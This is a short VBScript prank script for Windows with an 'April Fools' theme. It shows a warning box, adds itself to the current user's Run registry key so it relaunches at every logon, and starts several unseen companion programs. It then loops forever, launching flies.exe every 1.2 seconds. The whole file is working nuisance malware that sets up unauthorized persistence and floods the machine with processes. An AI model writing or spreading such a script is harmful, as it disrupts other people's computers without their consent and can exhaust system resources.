a=msgbox("Hey there! Just warning you that is it's the aPRil F0Olz moment!"&vbCrLf&"Just prepare to be pranked."&vbCrLf&"So you just have to wait 'till the music ends to remove all this mess."&vbCrLf&"  Good Luck!",48,"aPRil F0Olz!!")
Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
shell.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\AprilFools_Prank1",WScript.ScriptFullName,"REG_SZ"
shell.run("bgAudio.vbs")
shell.run("cd-rom.exe")
shell.run("kbd.vbs")
do
shell.run("flies.exe")
WScript.sleep(1200)
loop